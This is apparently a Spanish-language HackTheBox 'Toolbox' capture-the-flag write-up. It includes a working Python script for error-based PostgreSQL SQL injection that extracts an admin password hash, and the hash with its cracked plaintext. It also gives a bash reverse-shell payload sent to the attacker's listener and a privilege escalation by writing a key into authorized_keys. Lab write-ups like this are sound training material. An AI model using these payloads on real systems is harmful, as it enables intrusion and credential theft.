---
title: HackTheBox - Toolbox
author: cotes
date: 2023-09-06 17:51:00 +0800
categories: [Writeup, HackTheBox, Easy]
tags: [Windows, 'Default Credentials', 'SQL Injection', 'Docker Toolbox']
math: true
mermaid: true
image:
  path: /assets/images/HTB/Easy/Toolbox/logo.png
  lqip: data:image/webp;base64,UklGRpoAAABXRUJQVlA4WAoAAAAQAAAADwAABwAAQUxQSDIAAAARL0AmbZurmr57yyIiqE8oiG0bejIYEQTgqiDA9vqnsUSI6H+oAERp2HZ65qP/VIAWAFZQOCBCAAAA8AEAnQEqEAAIAAVAfCWkAALp8sF8rgRgAP7o9FDvMCkMde9PK7euH5M1m6VWoDXf2FkP3BqV0ZYbO6NA/VFIAAAA
  alt: Toolbox Machine Logo
---

Máquina Windows de nivel **Easy** de HackTheBox.

Técnicas usadas: **Default Credentials, SQL Injection, Docker Toolbox**


### Fase de Reconocimiento 🧣

a. Enumeramos los puertos que están abiertos en la **Máquina Toolbox**

* **`nmap -p- -sS -Pn -n <IP> -oG puertos`**

  ![](/assets/images/HTB/Easy/Toolbox/01-ports.png)

b. Vemos las versiones de los servicios que se están ejecutando en los puertos.

* **`nmap -p<Ports> -sCV <IP> -oN versiones`**

  ![](/assets/images/HTB/Easy/Toolbox/02-versions.png)

  * Conseguimos un dominio **admin.megalogistic.com** el cual añadiremos al archivo **/etc/hosts**.
  * Vemos un fichero **docker-toolbox.exe** en el servicio FTP.

c. Visitamos el dominio **https://admin.megalogistic.com**

![](/assets/images/HTB/Easy/Toolbox/03-web.png)

* Aquí intentaremos una **inyección sql** y al momento de ingresar una sentencia incorrecta veremos un mensaje el cual nos dirá que base de datos se usa

  ![](/assets/images/HTB/Easy/Toolbox/04-db.png)

* Inyecciones SQL en [PostgreSQL](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md)

* Automatizamos la inyección sql basada en error con **python** para obtener la contraseña del usuario **admin**

  * Basándonos en la lógica del script y la inyección previamente obtenemos el nombre actual de la base de datos **test**, una tabla **users** y sus columnas **username,password**

    ```python
    import requests
    import string
    from pwn import *
    import sys
    import signal
    import urllib3

    def exit_handler(sig, frame) -> None:
      print("[!] Exit")
      sys.exit(1)

    def get_currentdb() -> None:
      global_string = string.ascii_letters + string.digits + string.punctuation + ' '
      main_url = "https://admin.megalogistic.com/"

      bar_1 = log.progress("Brute Force")
      bar_1.status("Starting Brute Force...")
      bar_2 = log.progress("admin password")
      headers = {"Cookie" : "PHPSESSID=[Cambiar]", "Content-Type": "application/x-www-form-urlencoded"}
      password = ""
      lenght = 0
      for index in range(1,50):
        for character in global_string:
          data = {"username":f"admin'||(select case when substring(password,{index},1)='{character}' then 1/(select 0) else NULL end from users limit 1)-- -", "password": "admin"}
          bar_1.status(data["username"])
          r = requests.post(main_url, headers=headers, data=data, verify=False)
          if('division by zero in' in r.text):
            lenght += 1
            password += character
            bar_2.status(str(lenght) + ': ' + password)
            break

    if __name__ == "__main__":
      urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
      signal.signal(signal.SIGINT, exit_handler)
      get_currentdb()
    ```


* Esta credencial está hasheada con **MD5**, la obtenemos en texto claro

  ```bash
  [>] Brute Force: admin'||(select case when substring(password,39,1)='C' then 1/(select 0) else NULL end from users limit 1)-- -
  [..../...] admin password: 42: 4a100a85cb5ca3616dcf137918550815
  
  dcode 4a100a85cb5ca3616dcf137918550815
  [+] Cracked MD5 Hash : iamzeadmin
  ```

d. Al autenticarnos estaremos en un **dashboard** en el que no vemos información relevante, con lo cual intentaremos ejecutar comandos con la inyección sql [RCE con PostreSQL](https://book.hacktricks.xyz/network-services-pentesting/pentesting-postgresql#rce)

* Usaremos el payload

  ![](/assets/images/HTB/Easy/Toolbox/05-payload.png)

* Levantamos un servidor con **python** y enviaremos la petición con **BurpSuite**

  ![](/assets/images/HTB/Easy/Toolbox/06-burp.png)

  > A pesar de ver una error en la ejecución del comando, nos llega la petición con el **output del comando** en base64 a nuestro servidor de python.


* Nos entablaremos una reverse shell, para esto nos ponemos en escucha previamente con **nc** y enviaremos la siguiente petición con **BurpSuite**

  * El payload usado es: **`bash -c "bash -i >& /dev/tcp/<tun0 IP>/443 0>&1"`**

    ![](/assets/images/HTB/Easy/Toolbox/07-reverse.png)

    ```bash
    nc -lvnp 443
    postgres@bc56e3cc55e9:/var/lib/postgresql/11/main$
    ```

e. Vemos que estamos en un contenedor

```bash
postgres@bc56e3cc55e9:/var/lib/postgresql/11/main$ ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
  inet 172.17.0.2  netmask 255.255.0.0  broadcast 172.17.255.255

postgres@bc56e3cc55e9:/var/lib/postgresql/11/main$ uname -a
Linux bc56e3cc55e9 4.14.154-boot2docker #1 SMP Thu Nov 14 19:19:08 UTC 2019 x86_64 GNU/Linux
```

* Con la información reunida consultamos sobre **Boot2Docker** y **Docker-ToolBox**. Encontramos una forma de [autenticarnos en ssh](https://stackoverflow.com/questions/30330442/how-to-ssh-into-docker-machine-virtualbox-instance)

  ```bash
  postgres@bc56e3cc55e9:/var/lib/postgresql/11/main$ ssh docker@172.17.0.1
  docker@172.17.0.1's password: 
    ( '>')
    /) TC (\   Core is distributed with ABSOLUTELY NO WARRANTY.
  (/-_--_-\)           www.tinycorelinux.net

  docker@box:~$
  ```

### Escalada de Privilegios 💹

a. Exploramos este host

```bash
docker@box:/c/Users/Administrator$ ls -al                                      
total 1613
drwxrwxrwx    1 docker   staff         8192 Feb  8  2021 .
dr-xr-xr-x    1 docker   staff         4096 Feb 19  2020 ..
drwxrwxrwx    1 docker   staff         4096 Aug 28 15:13 .VirtualBox
drwxrwxrwx    1 docker   staff            0 Feb 18  2020 .docker
drwxrwxrwx    1 docker   staff            0 Feb 19  2020 .ssh
```

* Encontramos un directorio **.ssh** en el que podemos meter nuestra clave pública **authorized_keys**

  ```bash
  docker@box:/c/Users/Administrator/.ssh$ ls                                     
  authorized_keys  id_rsa           id_rsa.pub       known_hosts
  ```

* Generemos un par de claves en nuestra **Máquina Atacante**

  ```bash
  ❯ ssh-keygen
  ❯ ls
  id_rsa   id_rsa.pub
  ```

* Copiamos la clave **id_rsa.pub** en el archivo **authorized_keys** del host docker

  ```bash
  docker@box:/c/Users/Administrator/.ssh$ echo -n 'id_rsa.pub' > authorized_keys
  ```

b. Ya con esto podemos acceder como **administrator** en el servicio SSH

```bash
root@kali~/.ssh> ssh administrator@10.10.10.236

Microsoft Windows [Version 10.0.17763.1039] 
administrator@TOOLBOX C:\Users\Administrator>
```